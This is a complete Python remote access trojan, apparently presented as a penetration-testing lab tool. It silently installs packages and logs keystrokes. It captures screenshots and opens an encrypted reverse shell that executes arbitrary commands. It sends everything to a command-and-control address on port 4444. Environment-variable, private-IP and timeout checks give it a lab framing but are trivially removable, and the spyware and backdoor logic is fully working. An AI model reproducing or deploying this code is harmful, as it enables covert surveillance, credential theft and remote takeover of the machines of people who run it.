import os, sys, subprocess, importlib, socket, threading, time, base64, struct, ipaddress
for pkg in ['pynput', 'PIL', 'Crypto', 'mss', 'requests']:
    try:
        importlib.import_module(pkg)
    except Exception:
        try:
            subprocess.call([sys.executable, '-m', 'pip', 'install', '--user', pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
try:
    import pynput.keyboard
    from PIL import Image
    import mss
    from Crypto.Cipher import AES
    import requests
except Exception:
    pass
C2_IP = '192.168.1.100'
C2_PORT = 4444
ENCRYPT_KEY = b'LabTestKey123456'
if os.environ.get('PENTEST_LAB') != '1':
    sys.exit(0)
try:
    ip = ipaddress.ip_address(C2_IP)
    if not (ip in ipaddress.ip_network('192.168.0.0/16') or ip in ipaddress.ip_network('10.0.0.0/8')):
        sys.exit(0)
except Exception:
    sys.exit(0)
try:
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
except Exception:
    pass
def timeout_exit():
    sys.exit(0)
threading.Timer(300, timeout_exit).start()
if 'Startup' in os.path.dirname(os.path.abspath(__file__)):
    sys.exit(0)
try:
    import winreg
    rk = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run')
    for i in range(winreg.QueryInfoKey(rk)[1]):
        if os.path.abspath(__file__) in winreg.EnumValue(rk, i)[1]:
            sys.exit(0)
except Exception:
    pass
def xor_enc(d):
    return bytes([d[i] ^ ENCRYPT_KEY[i % len(ENCRYPT_KEY)] for i in range(len(d))])
def aes_enc(d):
    try:
        c = AES.new(ENCRYPT_KEY, AES.MODE_ECB)
        p = 16 - len(d) % 16
        return c.encrypt(d + bytes([p]*p))
    except Exception:
        return xor_enc(d)
def aes_dec(d):
    try:
        c = AES.new(ENCRYPT_KEY, AES.MODE_ECB)
        dec = c.decrypt(d)
        return dec[:-dec[-1]]
    except Exception:
        return xor_enc(d)
def exfil(d, t='log'):
    try:
        requests.post('https://%s:%d/' % (C2_IP, C2_PORT), headers={'LAB-TEST':'1'}, data={'type':t,'data':d.decode()}, verify=False, timeout=5)
    except Exception:
        try:
            s = socket.socket()
            s.connect((C2_IP, C2_PORT))
            s.sendall(b'LAB-TEST' + aes_enc(d))
            s.close()
        except Exception:
            pass
keys = []
def on_press(k):
    try:
        keys.append(k.char)
    except Exception:
        keys.append(str(k))
    if len(keys) > 50:
        exfil(''.join(keys).encode(), 'key')
        keys.clear()
def keylog():
    while True:
        try:
            with pynput.keyboard.Listener(on_press=on_press) as l:
                l.join()
        except Exception:
            time.sleep(5)
def screenshot():
    while True:
        try:
            with mss.mss() as sct:
                img = sct.grab(sct.monitors[1])
                im = Image.frombytes('RGB', img.size, img.rgb)
                im.save('t.jpg', quality=30)
                with open('t.jpg','rb') as f:
                    exfil(base64.b64encode(f.read()), 'scr')
            os.remove('t.jpg')
        except Exception:
            pass
        time.sleep(30)
def recv_all(s):
    d = b''
    while True:
        c = s.recv(4096)
        if not c: break
        d += c
        if len(c) < 4096: break
    return d
def rshell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            s.sendall(b'LAB-TEST')
            while True:
                ln = s.recv(4)
                if not ln: break
                l = struct.unpack('>I', ln)[0]
                enc = recv_all(s)
                if enc.startswith(b'LAB-TEST'):
                    enc = enc[8:]
                cmd = aes_dec(enc)
                if cmd == b'exit': break
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                o = p.stdout.read() + p.stderr.read()
                out = aes_enc(o)
                s.sendall(struct.pack('>I', len(out)+8) + b'LAB-TEST' + out)
            s.close()
        except Exception:
            time.sleep(10)
def hb():
    while True:
        time.sleep(10)
        try:
            requests.post('https://%s:%d/hb' % (C2_IP, C2_PORT), headers={'LAB-TEST':'1'}, data='alive', verify=False, timeout=5)
        except Exception:
            pass
threading.Thread(target=keylog, daemon=True).start()
threading.Thread(target=screenshot, daemon=True).start()
threading.Thread(target=rshell, daemon=True).start()
threading.Thread(target=hb, daemon=True).start()
while True:
    time.sleep(1)